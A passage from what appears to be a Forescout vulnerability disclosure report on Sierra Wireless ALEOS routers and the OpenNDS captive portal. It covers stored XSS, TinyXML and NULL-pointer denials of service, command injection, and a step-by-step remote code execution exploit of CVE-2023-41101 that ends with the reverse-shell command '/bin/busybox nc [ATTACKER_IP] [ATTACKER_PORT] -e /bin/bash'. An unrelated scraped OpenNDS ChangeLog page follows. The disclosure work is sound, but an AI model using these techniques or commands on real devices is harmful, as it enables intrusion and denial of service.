•

www/auth/viewer/* to the /admin/ URI. This means that both the legitimate files and the malicious files
uploaded as XML templates will be reachable with the /admin/ parent URL.
If the malicious file uploaded as an XML template has the same name as a legitimate file, it will be served
first. It is not clear why exactly this happens, but it could be due to a fresher file timestamp or simply
because the logic picks that folder first when it resolves a filename.

Because of the changes made to fix CVE-2018-4067, it is impossible to upload binary executables, such as
malicious CGI files. Therefore the capabilities of attackers are limited to malicious HTML and/or JavaScript
content only. The mailicios content that “overshadows” the legitimate files will likely persist until the technical
support deletes it (see our notes about “Diagnostic root shell” on Section 9.2).

The third web-based vulnerability, CVE-2023-40461, resides in the front-end code of the application.
ACEmanager allows users to configure an OpenVPN tunnel and upload a client certificate or a TLS key for
authentication. Because of missing validation of the key/certificate name, it is possible to inject JavaScript code
into the web page, a stored XSS.

Sierra:21 – Living on the Edge

23

Figure 13 – The vulnerable JavaScript code fragment related to CVE-2023-40461

Figure 13 (above) shows the vulnerable JavaScript code fragment causing the vulnerability. Here, the variable d
represents an HTML element on the web form, where user input will be displayed (the name of the uploaded
key/certificate); the variable b corresponds to the value of the user input taken from the web form. The jQuery
html() method (line 7) will convert user input to HTML, and, since there is no code that sanitizes user input, it is
possible to inject arbitrary HTML elements and JavaScript code.

The setTDValue() function is called from the backend CGI binary under the /cgi-
bin/Embedded_Ace_Set_Task.cgi URL (as shown below in Figure 14).

Figure 14 – A POST request for setting an OpenVPN certificate/key name

Here, the ID “10013” corresponds to the HTML element which is mapped to the “Certificate name” field that will
display the uploaded certificate name for one of the five VPN connections that can be configured. There are
several IDs (or fields) that can be set that way, and all of them are affected. For example, attackers can send the
POST request shown below in Figure 15. Then, whenever users navigate to the VPN setup page, the injected
JavaScript code will be executed.

Figure 15 – A “malicious” POST request

There is a 256-character limit for the payload that attackers can inject and there is input sanitization code that
would not allow symbols such as =, but this is not a huge limitation for determined attackers. For example, the
following obfuscated payload that steals important cookies and sends them to a remote server (as in Figure 16
below) will be accepted:

Sierra:21 – Living on the Edge

24

Figure 16 – A malicious POST request

Just like with CVE-2023-40460, attackers need to posess the valid token and csrf-token cookies.

We also noticed that the session cookie token does not have the HTTPOnly flag (CWE-1004), which would
prevent JavaScript client code from reading sensitive cookies through attacks like XSS. The missing flag allowed
us to read and steal the session token through the previously mentioned vulnerabilities.

9.4.  CVE-2023-40458 and CVE-2023-40462:

TinyXML denials of service

TinyXML has not been supported for some years, but ALEOS still embeds its source code directly into one of its
libraries (libSWIALEOS.so). We found one publicly known vulnerability that affects TinyXML (CVE-2021-42260)
and has not been fixed in the latest version of the project.

Figure 17 (below) shows the vulnerable code fragment in TinyXML that causes CVE-2023-40458. The
TiXmlParsingData::Stamp() function is called when an XML document is parsed (one byte at a time). To
trigger the bug, the document must start with the byte sequence 0xef 0xbb 0xbf, which will ensure that the
document encoding is interpreted as UTF-8, so that we could eventually enter the if branch on line 10.

Figure 17 – The vulnerable code fragment in TinyXML responsible for CVE-2023-40458

Sierra:21 – Living on the Edge

25

One of the following bytes of a malformed XML document must be set to 0xef (TIXML_UTF_LEAD_0), so that we
enter the if branch on line 11. If one of the next bytes (p+1 or p+2) is set to 0x00 (NULL), none of the code shown
on lines 16 to 23 will be executed. This means that on the next iteration of the while loop, the byte pointer p will
not be incremented and the code will parse the same byte sequence repeatedly. This leads to a DoS via an
infinite loop. The root cause of the issue is very similar to some of the antipatterns that we encountered during our
previous research on Project Memoria.

We confirmed that the source code of TinyXML that ships with ALEOS (within one of the libraries of
ACEmanager) contains the vulnerability as well. One of the most straightforward ways to trigger the issue is by
interacting with the backend URL that processes XML documents containing the login and the password (see our
notes about CVE-2023-40459 in Section 9.3).

Figure 18 – A payload that will trigger CVE-2023-40458 in ACEmanager

Figure 18 (above) shows a POST request containing a crafted payload that triggers the issue in ACEmanager. As
a result, ACEmanager gets stuck in an infinite loop and stops responding to clients. To restore its functionality, a
device must be manually restarted. Attackers do not need to be authenticated to exploit the issue.

To find more issues on TinyXML, we created a simple fuzzer based on libFuzzer. Almost immeditalely, we got a
hit: CVE-2023-34194 / CVE-2023-40462. When a certain malformed document is parsed by TinyXML, it hits a
reachable assertion within the code and terminates the application with the SIGABRT signal.

Figure 19 – The root cause of CVE-2023-34194 (CVE-2023-40462)

Sierra:21 – Living on the Edge

26

The root cause of the issue is shown above in Figure 19. TiXmlDeclaration::Parse() is called for the input
that starts with the characters <?xml and the while loop in that function processes the next characters one by
one. On line 31, the function TiXmlBase::SkipWhitespace() is called and advances the character pointer p
past any whitespace characters encountered. If we craft a document that, after the <?xml characters, has a
whitespace character followed by a NULL character (“0x00”), the SkipWhitespace() call on line 31 will advance
p directly to that NULL character.

The StringEqual() function call on line 32 looks for the XML version substring: the assert() call on line 8
checks whether the pointer p points at a nonzero-address. However, if the value of that pointer (that is, the current
character being parsed) is NULL (“0x00”), the code will hit the assertion on line 10 and terminate.

For ACEmanager, the bug can be triggered similarly to CVE-2023-40458, as shown below in Figure 20. Unlike
CVE-2023-40458, though, it crashes the application, and since ACEmanager runs as a service, it will be
automatically restarted in a few seconds. However, attackers can keep sending malformed XML documents,
prolonging the DoS indefinitely. All currently logged-in users are also immediately logged out. Attackers do not
need to be authenticated to exploit the issue.

Figure 20 – A payload that will trigger CVE-2023-40462 in ACEmanager

9.5.  OpenNDS NULL-pointer dereference issues

Knowing that ALEOS ships with an older version of OpenNDS, we looked at the commit messages within its
source code repository to see if there were any silent patches for security issues or other relevant bugs.
Immediately, we found the commit shown below in Figure 21.

Figure 21 – The commit message for a patch that fixes a NULL-pointer dereference issue in OpenNDS

Figure 22 (below) shows the important parts of the patch. The changes are highlighted with the red rectangle on
line 18. The MHD_get_connection_values() function performs a lookup of the value of the Accept HTTP
header within an incoming HTTP request and stores the result into the accept variable; if the Accept header is
not present in the request, the value of the accept pointer will be NULL. Before the patch, the call to strcmp() on
line 18 would cause a segmentation fault if the value of accept is NULL, crashing OpenNDS and causing a
denial-of-service condition.

Sierra:21 – Living on the Edge

27

Figure 22 – A NULL-pointer dereference patch found in the OpenNDS git repository

This issue affects neither OpenNDS 9.1.1 –  since it does not contain any code that extracts the Accept header –
nor can it be exploited in the latest versions of OpenNDS, as the issue was fixed.

However, we found that this is a common code pattern from libmicrohttpd for extracting various parts of HTTP
requests, such as headers and query string parameters. Since we saw only one patch, we wondered whether the
developers made this mistake only once.

We identified 6 very similar new NULL-pointer dereference issues in various places: CVE-2023-38320, CVE-
2023-38315, CVE-2023-38314, CVE-2023-38313, CVE-2023-38322, and CVE-2023-38321. We do not describe
all of them in detail, as it suffices to say that they all exhibit the same “anti-pattern”:

•  Declare a pointer that will point to the value retrieved from an HTTP request.
•  Do not initialize the pointer (or initialize it with NULL explicitly).
•  Call the MHD_get_connection_value() function, passing said pointer as a reference.
•  Do not check whether the pointer is not NULL after the function returns.
•  Use the pointer as an argument to a function that requires the pointer to be initialized, such as strcmp()

or strlen().

Figure 23 (below) shows another code fragment that exhibits the above anti-pattern. In this case, OpenNDS can
be crashed with an HTTP request that lacks the User-Agent header. Triggering this issue is extremely simple,
and can be done with a single HTTP request: GET /opennds_preauth/ HTTP/1.1 Accept: none .

Sierra:21 – Living on the Edge

28

Figure 23 – An example of another NULL-pointer dereference issue (CVE-2023-38320)

When exploiting any of the aforementioned issues, the OpenNDS deaemon will crash and will have to be
restarted (Figure 24 below shows the log relevant messages). While OpenNDS is down, users are be unable to
connect to the networks governed by the captive portal, and Internet access will be denied.

Figure 24 – Crashing the OpenNDS daemon in ALEOS

9.6.  OpenNDS OS command execution

We also identified several issues that may lead to OS command execution. These vulnerabilities do not affect
ALEOS directly, as they require certain changes (or the ability to make these changes) to the main configuration
file of OpenNDS – opennds.conf.

The most severe is CVE-2023-38316: when the custom URL unescape callback is enabled in the OpenNDS
configuration file, attackers can execute arbitrary OS commands with crafted HTTP requests. (See Figure 25
below)

Sierra:21 – Living on the Edge

29

Figure 25 – The custom “unescape()” function in OpenNDS

Figure 25 shows the function unescape() that will be called to unescape URLs for each HTTP request when the
custom unescape callback is enabled. The name of the execute_ret_url_encoded() function called on line 10
is misleading, as it does not encode the OS command passed into it (see Figure 26 below). The underlying
_execute_ret() function will execute a command cmd as is, therefore it must be escaped and validated
beforehand. Since this is not done at all, attackers can inject additonal commands in place of the arguments to
the unescape.sh script.

Figure 26 – The execute_ret_url_encoded() function

The injected OS commands will be executed with the privileges of the OpenNDS daemon (most likely, root).
Figure 27 (below) shows an example of such a crafted URL that will send the contents of the /etc/shadow back
to the attacker. It is also possible to launch a reverse shell, for instance.

Figure 27 – Exploiting CVE-2023-38316

The exploitability of four other OS command injection vulnerabilities (CVE-2023-38317, CVE-2023-38318, CVE-
2023-38319, CVE-2023-38323) summarized previously in Table 2 depends on whether the attackers can modify
the opennds.conf configuration file directly or indirectly. For example, these vulnerabilities cannot be exploited in
current versions of ALEOS, since the file cannot be changed by users. However, on other manufacturers’ devices,
it may be possible to adjust certain captive portal settings via the UI and have them reflected in the configuration
file. In this case, if the user input is not sanitized, the vulnerabilities may be exploitable.

Sierra:21 – Living on the Edge

30

9.7.  OpenNDS memory leaks and remote code

execution

We also had a quick look at a release of OpenNDS that came after our initial findings against version 9.x: version
10.1.1. The new major version fixed several of the issues we found in 9.x and performed major refacatoring of
some functionality, in particular, changing the way memory is allocated. For example, many buffers allocated
previously in the stack are now allocated in the heap.

This major refactoring resulted in multiple memory leaks such that when the captive portal runs on a device with
constrained resources (such as many IoT devices), attackers may take the portal offline by creating multiple
connections (we filed all these memory leaks under the umbrella of CVE-2023-41102). One of the most prominent
examples was explicit memory allocation for a buffer before passing it into “safe_asprintf()”, as shown below in
Figure 28.

Figure 28 – An example of a memory leak related to safe_asprint()

Here, “safe_asprintf()” (wrapper around vasprintf()) will take care of allocating the destination buffer. However, a
buffer is being allocated in the “show_preauthpage()” function as well. In this case, when the pointer to the buffer
(cmd) is eventually passed into “free()” (line 15), the call will deallocate the memory allocated by “vasprintf()”, but
the pointer to the first allocation will be lost, and that memory will never be freed.

While examining the code for memory leaks, we stumbled upon CVE-2023-41101: the function that parses query
strings parameters in OpenNDS is vulnerable to a stack buffer overflow in versions 9.x (used by Sierra Wireless),
and a heap-based buffer overflow in OpenNDS 10.x and onwards. Below, we only discuss the stack-based
overflow.

The code snippet shown below in Figure 29 reveals how a buffer for a query string (query_str) is declared. The
value of QUERYMAXLEN is set to 8192 by default.

Sierra:21 – Living on the Edge

31

Figure 29 – The “preauthenticated()” function where the buffer “query_str” is declared

The function “get_query()” is called in several places of “preauthenticated()” and is used to populate the query
(query_str) buffer with the contents of the query string sent by users via GET HTTP requests. There are almost no
differences between the function “get_query()” in the versions 9.x and 10.x of OpenNDS. In fact, we identified that
the code originates from the NoDogSplash captive portal. Therefore, OpenNDS and the original NoDogSplash
project share the same vulnerability.

Figure 30 shows the implementation of the “get_query()” function (some code was omitted for brevity). The
second parameter of the function is a pointer to the query_str buffer declared in “preauthenticated()”. The root of
the problem with this function is shown on the lines 14 and 24:

•  First, the length of an individual query string parameter is calculated with the “strlen()” function. Despite its
name that implies its purpose for calculating the length of strings, it actually calculates the length of any
sequence of bytes until the position that contains the 0x00 (NULL) byte. Therefore, attackers can control
the length variable by sending sequences of arbitrary bytes in place of query string parameters, and
placing the NULL byte into a chosen position.

•  Second, the fixed query_str buffer gets populated with the attacker-provided data, based on the attacker-

controlled length.

To summarize, if the captive portal receives a GET request with a query string parameter that is longer than
QUERYMAXLEN (8192 bytes by default) (see Figure 30 below), the stack may be corrupted by overwriting it with
attacker-controlled data, leading to a Denial-of-Service or a Remote Code Execution.

Sierra:21 – Living on the Edge

32

Figure 30 – The “get_query()” function

The original vulnerability in OpenNDS/NoDogSplash looked as if it could be exploited by attackers. Yet, we
wished to understand whether they could achieve arbitrary code execution on a Sierra Wireless target which we
had in our lab.

10.  Technical Dive-In #3: Exploiting CVE-2023-41101

on LX60

In this Section, we detail how we exploited CVE-2023-41101 against a Sierra Wireless LX60 running the latest
available version of ALEOS, 4.16.0. To exploit this vulnerability, attackers do not need to be authenticated with
ALEOS, but there are three requirements:

(1)  They need to be within the range of the WiFi network that is configured to run the OpenNDS captive

portal;

(2)  They must know or crack the WiFi password if it is password-protected to be able to connect to the

network and interact with OpenNDS. Although typically, in public places WiFi networks controlled by
captive portals are NOT password-protected;

(3)  They need to guess the thread-local heap base address (more on that later, but chances of success are

quite high).

(4)

Sierra:21 – Living on the Edge

33

10.1.  A closer look at the binary

Since we had no debugging capabilities on the target (because, by design, root login is disabled), we started by
emulating the OpenNDS binary shipped with ALEOS 4.16.0. This allowed us to establish the following:

•  The binary has full symbols. While this is not strictly necessary, as the source code of OpenNDS is

available, it is very handy.

•  The NX (no-execute) bit is set during compilation, rendering the stack and the heap not executable.

We cannot inject shellcode into these memory regions.

•  ASLR (Addres Space Layout Randomization) is enabled, thus (in theory) all virtual memory regions are

subject to base address randomization.

•  The PIE (Position Independent Executable) option is disabled. Even if ASLR is enabled, the base
address of the executable itself (and function addresses) will not be randomized. This allows for
considering ROP (Return-Oriented Programming) or “return-to-libc” techniques that allow to bypass ASLR
altogether. The lack of PIE also simplifies Information Leak attacks that are sometimes needed to defeat
ASLR.

To summarize, we had the NX and ASLR memory protection mechanisms to defeat but the absence of PIE could
make our job much easier. This, yet again, shows that a single memory protection measure is never enough, and
if used alone can be a mere nuisance to attackers.

Figure 31 – The layout of the stack on the ARM32 binary of OpenNDS used in ALEOS 4.16

Before developing the exploit, we must see how the overflown stack appears. Figure 31 (above) shows the layout
of the stack just before we exit the “preauthenticated()” function under normal circumstances:

•  The 8 bytes at the address 0x3fe2d42c (marked in orange) are the last 8 bytes that belong to the
query_str buffer. The next 8 bytes are the address stored in one of the local variables adjacent to
query_str.

•  The bytes marked in blue (0x3fe2d434 - 0x3fe2d450) are the saved registers from the function

“libmicohttpd_cb()” that calls “preauthenticated()”. The “libmicrohttpd_cb()” function is a callback defined

Sierra:21 – Living on the Edge

34

in OpenNDS. This callback is invoked each time the underlying webserver library (libmicrohttpd) receives
a web request.

•  The bytes marked in red are the return address located somewhere within “libmicohttpd_cb()”, right after

the call to “preauthenticated()”.

•  The bytes marked in green are some of the registers being saved prior to calling the function

“libmicrohttpd_cb()”. Namely, 0x3f5006e8 points to a buffer that holds the entire HTTP request, and
0x3f5006ec points to a buffer that holds the value of the URL specified in that request.

10.2.  Limitations and caveats

Neither the heap nor the stack is executable, and ASLR is enabled but PIE is disabled. Therefore, jumping
between various functions of the binary is trivial, and the most straightforward strategy for exploiting this
vulnerability is as follows:

1.  Construct a ROP chain that allows the attacker to hijack the control flow and populate the right registers
with attacker-controlled data that eventually executes some useful function with attacker-controlled
parameters.

2.  Start by overflowing the query_str buffer in a way that allows control to jump to the beginning of that ROP
chain. Proceed with overwriting the rest of the stack past the original return address with the rest of the
gadgets of that ROP chain.

However, this would only work if the vulnerability allowed for arbitrary writes, which is not the case. Let us have
another look at the implementation of the “get_query()” function shown previously in Figure 28:

•  The use of the function “strlen()” on line 14 limits the overflow payload to byte sequences without zeros in
arbitrary positions. This means we cannot freely overwrite stack entries with addresses that contain zeros.
Since PIE is disabled, the absolute addresses for functions will have the highest byte equal to 0x00,
meaning we can only write such an address once when overflowing the query_str buffer.

•  To circumvent this, we could try to overwrite query_str in several iterations (see the loop that starts on line
20) by providing several NULL-terminated query string parameters. Unfortunately, this is not possible,
since the function contains another bug – the value of the variable “j” is never changed, therefore each
query string parameter will be writtein into the the same position in query_str.

•  After writing attacker-controlled data into query (pointer to the original query_str) at line 24, the code

eventually “detects” the overflow (lines 36-37), and stops writing query string data into another query_str
buffer declared in “get_query()” (yes, this is a bit confusing). As a result, on line 42, query (pointing to the
original query_str) will be overwritten with the contents of query_str (another buffer declared in
“get_query()”): this will write the symbol “?” and numerous NULL bytes (the exact number is determined
by QUERYMAXLEN) – on ARM32, this will give us 36 attacker-controlled bytes that can be placed on the
stack past the query_str buffer, just before the return address is reached.

These are tight constraints: we do not need to guess the function addresses within the main binary. But they all
contain NULL bytes in their addresses, meaning that we can only jump once by overwriting the return address of
“preauthenticated()”. The section below describes how we populate the function parameters with attacker-
controlled data.

10.3.  Finding information leaks

There are some promising functions within the main binary into which we can jump directly (for instance, there is
a PLT reference to “system()”), but they require populating either register R0 or R2 (scratch registers) with
attacker-controlled data (such as an OS command to be executed). We could not find any gadgets within the

Sierra:21 – Living on the Edge

35

main binary that would allow to do so with only one jump, but in libc they are plentiful. Besides, the libc addresses
likely do not have NULL bytes in them, as the library will be loaded into the virtual memory.

Figure 32 – system@plt in the OpenNDS ARM32 binary

Since ASLR is a part of the equation, this approach would require us knowing the base address of libc, which is
impossible without leaking some library addresses back to us. There was no way to exploit the original bug to
achieve information leaks, so we had to look around.

When examining the admin settings in ACEmanager, we spotted that logging is available and the verbosity of the
logs can be adjusted. OpenNDS has several levels of log verbosity as well, and by experimenting with the log
verbosity settings in ACEmanager, we could enable the debug messages produced by OpenNDS and see them
in ACEmanager’s log viewer.

Some of these debug messages are syslog messages produced by the “_debug()” function in OpenNDS. The
function accepts three parameters: a filename (register R0), a line (register R1), and a log level (register R2):

Figure 33 – The parameters of the “_debug()” function

Because of the aforementioned restrictions, we cannot populate any of these registers directly. However, we can
overwrite the return address of “preauthenticated()” with the address of “_debug()” (0x19854), and see what
happens.

Figure 34 – A pseudocode fragment from the “_debug()” function

Figure 34 (above) shows a pseudocode fragment from the “_debug()” function. The level argument is used to set
the debug level for the syslog, and if the debug level value is not supported (for example, when it is set to 42), it
will create a syslog message that says “Unhandled debug level: 42”. Also, note that level is stored in the register
R2 (see Figure 33).

Sierra:21 – Living on the Edge

36

That looks promising! We could have used functions like “printf().” However, they would never print a message
into the log window of ACEmanager, and we would be unable to see the output. After fiddling with the emulated
binary, we found that when the “preauthenticated()” call exits (at the very moment when we can redirect the
control flow), the value of the register R2 contains an address that likely belongs to a local heap of the thread that
is currently processing the GET request. (libmicrohttpd is using threads for individual client connections, and each
such thread seems to have its own thread stack along with a thread-local heap.) Therefore, by overwriting the
return address of the “preauthenticated()” call with the address of the “_debug()” function, we can leak the value
of the register R2 (an address in a thread-local heap).

Figure 35 – Looking at the leaked heap address in the log viewer of ACEmanager

Figure 35 (above) shows that we can indeed observe the leaked address in ACEmanager: in this case, the
leaked address is 0x76400470 (1983906928). This value changes slightly depending on how long OpenNDS
runs, how many connections it establishes with clients, and some other things. However, after multiple trials, we
noticed that the leaked addresses had low entropy. This is very good news, as it means that ASLR exhibits
common issues inherent to 32-bit systems: due to lack of randomness (8 bits only), default page size (4KB), the
default stack sizes (8MB), as well as memory alignment requirements, thread stacks (and thread-local heaps) can
have only a few practical base addresses, rendering ASLR ineffective.

Out of 15 runs, in 9 cases the base of the leaked address was 0x76400000, and 0x76500000 in 6 cases.
Moreover, in almost all cases, the lower bits of the address were exactly the same (e.g., 0x76400470). If we
examine the memory in the vicinity of that addres, we see that the URL of the GET request are located at the
offset 0x27c in most of the runs – this gives us the address 0x764006ec of the URL. Since we control the
contents of the URL and now can reliably infer its absolute address, we could look for a proper gadget that allows
placing it into the right register.

10.4.  Putting it all together

By now we have established that we can reliably infer the address of the URL buffer that is under our control. The
binary does not contain many useful gadgets that allow us to populate either R0, or the R2 registers, and achieve
an arbitary jump at the same time. Also, becuase of the constraints imposed by “strlen()” that we discussed
before, we cannot achieve a “write-what-where” condition, as we cannot prevent the binary from crashing.

Sierra:21 – Living on the Edge

37

However, the “_execute_ret()” function which we briefly covered during our discussion of CVE-2023-38316 comes
to the rescue!

Figure 36 – One gadget to rule them all

As can be seen in Figure 31, when “preauthenticated()” exits, it first pops the registers R4-R11 before popping
the last value from the stack into the PC register. Therefore, if we overwrite the stack in such a way that the value
that will be popped into R4 is set to the address of the URL buffer, and overwrite the value that will be popped into
PC (the return address) with the address of the gadget shown on Figure 36, we can achieve arbitrary OS
command execution.

Figure 37 (below) illustrates such an exploit in action (note that this screenshot was obtained from the binary run
in an emulator, therefore the base address of the thread-local heap where the URL buffer is allocated will be
different on the physical device):

•  The bytes in orange are the last 8 bytes of the query_str buffer that gets overflown.
•  The bytes in blue are just padding.
•  The bytes in green are the address of the URL buffer under our control.
•  Finally, the bytes in red are the new return address (the gadget that starts at 0x241c8, see Figure 36).

Figure 37 – The exploit illustrated

When crafting a malicious GET request, we ensure that the URL portion of the request contains the arbitrary OS
command that we wish to execute, and we overflow the query_str buffer in such a way that the likely address of
the URL buffer will be popped into the register R4 and the address of the gadget (0x241c8) will be popped into
the PC register. This is how we achieve arbitrary OS command execution with root privileges (OpenNDS reqiures

Sierra:21 – Living on the Edge

38

superuser privileges to run). This happens when we can successfully “guess” the address of the URL buffer
(happens in about 60% of cases).

Since ALEOS ships with a variety of standard Linux utilities, including busybox, we can set the URL buffer to be
“/bin/busybox nc [ATTACKER_IP] [ATTACKER_PORT] -e /bin/bash” to start a reverse shell back to the
attacker’s machine (see Figure 38 below). From there, attackers can do anything they wish with the device,  such
as set a different root password and launch an SSH server. While this vulnerability does not have 100% chance
of success on the first attempt (due to an effect of ASLR and threading), it is a very nice way to “jailbreak”, or
achieve full root access, into a device where such access is restricted by the manufacturer.

Figure 38 – Successful exploitation of CVE-2023-41101 on LX60

© 2023 Forescout Technologies, Inc. All rights reserved. Forescout Technologies, Inc. is a Delaware corporation. A list of our trademarks and

patents is available at www.forescout.com/company/legal/intellectual-property-patents-trademarks. Other brands, products or service names

may be trademarks or service marks of their respective owners. 12062023_01_02

Sierra:21 – Living on the Edge

39



=== Content from github.com_46548177_20250115_093419.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FopenNDS%2FopenNDS%2Fblob%2Fmaster%2FChangeLog)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FopenNDS%2FopenNDS%2Fblob%2Fmaster%2FChangeLog)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=openNDS%2FopenNDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openNDS](/openNDS)
/
**[openNDS](/openNDS/openNDS)**
Public

* [Notifications](/login?return_to=%2FopenNDS%2FopenNDS) You must be signed in to change notification settings
* [Fork
  88](/login?return_to=%2FopenNDS%2FopenNDS)
* [Star
   338](/login?return_to=%2FopenNDS%2FopenNDS)

* [Code](/openNDS/openNDS)
* [Issues
  4](/openNDS/openNDS/issues)
* [Pull requests
  1](/openNDS/openNDS/pulls)
* [Actions](/openNDS/openNDS/actions)
* [Projects
  0](/openNDS/openNDS/projects)
* [Security](/openNDS/openNDS/security)
* [Insights](/openNDS/openNDS/pulse)

Additional navigation options

* [Code](/openNDS/openNDS)
* [Issues](/openNDS/openNDS/issues)
* [Pull requests](/openNDS/openNDS/pulls)
* [Actions](/openNDS/openNDS/actions)
* [Projects](/openNDS/openNDS/projects)
* [Security](/openNDS/openNDS/security)
* [Insights](/openNDS/openNDS/pulse)

## Files

 master
## Breadcrumbs

1. [openNDS](/openNDS/openNDS/tree/master)
/
# ChangeLog

Copy path Blame  Blame
## Latest commit

## History

[History](/openNDS/openNDS/commits/master/ChangeLog)815 lines (730 loc) · 49.8 KB master
## Breadcrumbs

1. [openNDS](/openNDS/openNDS/tree/master)
/
# ChangeLog

Top
## File metadata and controls

* Code
* Blame

815 lines (730 loc) · 49.8 KB[Raw](https://github.com/openNDS/openNDS/raw/refs/heads/master/ChangeLog)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814opennds (10.3.0) \* Fix - missing exit in library call [bluewavenet] \* Add - support for mesh11sd meshnodes and reimplement auth\_restore to not use ndsctl - [bluewavenet] \* Fix - formatting of ThemeSpec scripts - [bluewavenet] \* Fix - move parsing of custom vaiables and fields to libopennds library script - [bluewavenet] \* Fix - move custom\_variables\_list parsing to liboppennds library - [bluewavenet] \* Fix - parsing of custom variables list - [bluewavenet] \* Fix - non placeholder themespec logo size - [bluewavenet] \* Fix - formatting of themespec custom placeholders and status page - [bluewavenet] \* Fix - missing parseing of custom files list in config - [bluewavenet] \* Fix - issue #596, Problem with fasremotefqdn that has multiple IPs ( CDN ) - [bluewavenet] [viniciussotti ] \* Add - download protocol debug message - [bluewavenet] \* Add - function resolve\_fqdn() - [bluewavenet] \* Fix - failure to parse custom variables and custom images from config lists - [bluewavenet] \* Fix - issue #582, ensure list dhcp-option-force is added to the correct dnsmasq zone - [bluewavenet] [flintt] \* Fix - issue #591, error adding nft rule when fasremotefqdn not set - [bluewavenet] [billz] \* Fix - change error message to debug message when legacy ipset not present - [bluewavenet] \* Fix - issue #588, Remove default value for faskey - [bluewavenet] [billz] \* Fix - some memory leaks - [bluewavenet] [LuMingYinDetect] \* Fix - typo preventing reload of dnsmasq - [bluewavenet] \* Fix - issue #571, CVE-2024-25763, use after free - we now delete the client instead of changing state - [bluewavenet] [LuMingYinDetect] \* Fix - Evaluate system call return values - [bluewavenet] [sunweaver] \* Fix - enable iteration counter for all nft error codes - [bluewavenet] \* Fix - issue #556, use dnsmasq reload instead of restart - [bluewavenet] [rafaelfelix] \* Fix - remove unneeded memory allocation - [bluewavenet] \* Fix - ensure all client memory is freed when removing client - [bluewavenet] \* Fix - remove unneeded memory allocations and free some strdup allocations - [bluewavenet] \* Fix - race condition when dnsmasq takes too long to restart - [bluewavenet] \* Add - issue #547, Support specifying DHCP leases file location [mcassaniti]
